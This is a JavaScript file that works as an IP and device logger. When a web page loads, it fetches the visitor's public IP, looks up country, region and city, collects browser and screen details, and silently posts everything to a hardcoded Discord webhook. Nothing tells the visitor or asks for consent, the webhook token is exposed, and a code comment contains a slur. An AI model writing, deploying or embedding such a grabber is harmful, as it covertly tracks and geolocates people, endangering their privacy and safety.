function getDeviceDetails() {  
  const details = {  
   userAgent: navigator.userAgent,  
   platform: navigator.platform,  
   language: navigator.language,  
   screenWidth: window.screen.width,  
   screenHeight: window.screen.height,  
   colorDepth: window.screen.colorDepth,  
   pixelDepth: window.screen.pixelDepth,  
   online: navigator.onLine,  
  };  
  
  // nicecode(retard)
  if (/Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {  
   details.isMobile = true;  
  } else {  
   details.isMobile = false;  
  }  

  
  if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {  
   details.isTouchDevice = true;  
  } else {  
   details.isTouchDevice = false;  
  }  
  
  return Promise.resolve(details);  
}  
  
$(document).ready(function () {  
  $.get("https://api.ipify.org?format=json", function (data) {  
   $.get("https://ipinfo.io/" + data.ip + "/json", function (ipData) {  
    getDeviceDetails().then(function (deviceDetails) {  
      const embed = {  
       "title": "Device Information",  
       "description": "IP Address: " + data.ip,  
       "fields": [  
        {  
          "name": "Country",  
          "value": ipData.country,  
          "inline": true  
        },  
        {  
          "name": "Region",  
          "value": ipData.region,  
          "inline": true  
        },  
        {  
          "name": "City",  
          "value": ipData.city,  
          "inline": true  
        },  
        {  
          "name": "VPN",  
          "value": ipData.usingVPN === true ? "Detected" : "Not Detected",  
          "inline": true  
        },  
        {  
          "name": "User Agent",  
          "value": deviceDetails.userAgent,  
          "inline": false  
        },  
        {  
          "name": "Platform",  
          "value": deviceDetails.platform,  
          "inline": true  
        },  
        {  
          "name": "Language",  
          "value": deviceDetails.language,  
          "inline": true  
        },  
        {  
          "name": "Screen Width",  
          "value": deviceDetails.screenWidth,  
          "inline": true  
        },  
        {  
          "name": "Screen Height",  
          "value": deviceDetails.screenHeight,  
          "inline": true  
        },  
        {  
          "name": "Color Depth",  
          "value": deviceDetails.colorDepth,  
          "inline": true  
        },  
        {  
          "name": "Pixel Depth",  
          "value": deviceDetails.pixelDepth,  
          "inline": true  
        },  
        {  
          "name": "Online",  
          "value": deviceDetails.online,  
          "inline": true  
        },  
        {  
          "name": "Is Mobile",  
          "value": deviceDetails.isMobile,  
          "inline": true  
        },  
        {  
          "name": "Is Touch Device",  
          "value": deviceDetails.isTouchDevice,  
          "inline": true  
        }  
       ]  
      };  
  
      $.ajax({  
       url:  "https://discord.com/api/webhooks/1290539045935517707/Y-3_x6_HtrRGrh4sCmAiUjrh3NCgXwS2vNsl0VAx8ij76inM30SrmDO9x_o4wXanrGuq",  
       type: 'POST',  
       data: JSON.stringify({ "embeds": [embed] }),  
       contentType: 'application/json'  
      });  
    });  
   });  
  });  
});
          
